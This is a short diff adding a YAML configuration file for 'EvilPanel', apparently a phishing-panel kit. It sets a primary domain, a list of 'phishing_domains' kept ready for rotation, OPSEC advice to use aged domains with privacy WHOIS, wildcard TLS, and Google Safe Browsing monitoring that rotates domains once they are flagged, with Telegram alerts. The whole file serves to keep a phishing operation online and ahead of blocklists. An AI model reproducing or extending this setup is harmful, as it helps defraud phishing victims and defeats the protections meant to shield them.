@@ -1,0 +1,38 @@
+# Domain Configuration for EvilPanel
+# OPSEC: Use aged domains with privacy WHOIS
+
+# Primary active domain
+primary_domain: "frontnews.site"
+
+# Backup domains for rotation (ready to activate)
+phishing_domains:
+  # Add backup domains here in this format:
+  # - domain: "example.com"
+  #   status: "backup"
+  #   notes: "Purchased 2024-01"
+
+# Cloudflare integration
+cloudflare:
+  enabled: false  # Set to true after running setup-cloudflare.sh
+  api_token: ""   # Store securely, do not commit
+  zone_id: ""     # Will be auto-populated by setup script
+
+# SSL configuration
+ssl:
+  provider: "letsencrypt"
+  wildcard: true
+  auto_renew: true
+
+# Domain rotation settings
+rotation:
+  trigger: "flagged"        # flagged, time, manual
+  interval_hours: 48        # For time-based rotation
+  auto_rotate: false        # Auto-rotate on flagging
+  notify_telegram: true     # Send alerts on rotation
+
+# GSB monitoring
+gsb_monitoring:
+  enabled: true
+  check_interval_hours: 6
+  notify_on_flagging: true
+  auto_rotate_on_flag: true
